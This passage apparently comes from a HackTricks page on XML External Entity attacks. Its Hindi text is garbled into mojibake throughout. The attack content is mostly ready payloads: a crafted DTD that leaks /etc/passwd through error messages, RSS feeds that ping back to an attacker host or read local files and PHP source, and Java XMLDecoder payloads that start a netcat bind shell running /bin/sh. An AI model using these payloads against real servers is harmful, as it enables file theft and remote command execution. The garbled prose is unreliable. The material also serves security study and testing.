рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд╛рд╡рд╛ 1.8 рдХрд╛ рд╣реИред рдЗрд╕ рдЬрд╛рд╡рд╛ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде рдПрдХ рдиреЛрдЯ рдХреА рд╕реАрдорд╛ рд╣реИ рдХрд┐ рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ /etc/passwd рдЬреИрд╕реЗ рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрдерддрд╛ рд╣реИред

рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рдбреЗрдЯрд╛ рдЙрджреНрдзрд╛рд░рдг
рдЗрд╕ рд╕реАрдорд╛ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбреАрдЯреАрдбреА рдлрд╝рд╛рдЗрд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдврдВрдЧ рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рд╣реИ рддрд╛рдХрд┐ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рд▓рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдбреЗрдЯрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛред
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, рдорд╣рддреНрд╡рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, DTD рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
рдпрд╣ рд╕рдВрд╢реЛрдзрди рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рд╕рдлрд▓ exfiltration рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЧрдП рддреНрд░реБрдЯрд┐ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╕рдлрд▓ XXE (XML External Entity) рд╣рдорд▓рд╛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП Out of Band рдФрд░ Error-Based рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред


## RSS - XEE

XXE рдЬреЛрдЦрд┐рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп XML рдЬрд┐рд╕рдореЗрдВ RSS рдкреНрд░рд╛рд░реВрдк рд╣реИред

### рдкрд┐рдВрдЧ рдмреИрдХ

рд╣рдорд▓рд╛рд╡рд░реНрдЧ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рд╕рд░рд▓ HTTP рдЕрдиреБрд░реЛрдз
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рд╕реНрд░реЛрдд рдХреЛрдб рдкрдврд╝реЗрдВ

PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE рд╕реЗ RCE рддрдХ

XMLDecoder рдПрдХ Java рдХреНрд▓рд╛рд╕ рд╣реИ рдЬреЛ рдПрдХ XML рд╕рдВрджреЗрд╢ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдСрдмреНрдЬ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рддрд╛
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## рдЙрдкрдХрд░рдг

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## рд╕рдВрджрд░реНрдн

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* рдЕрдкрдиреЗ рдмрд╛рд╣реНрдп DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВ: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks** рдХреЛ **PDF** рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs** рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
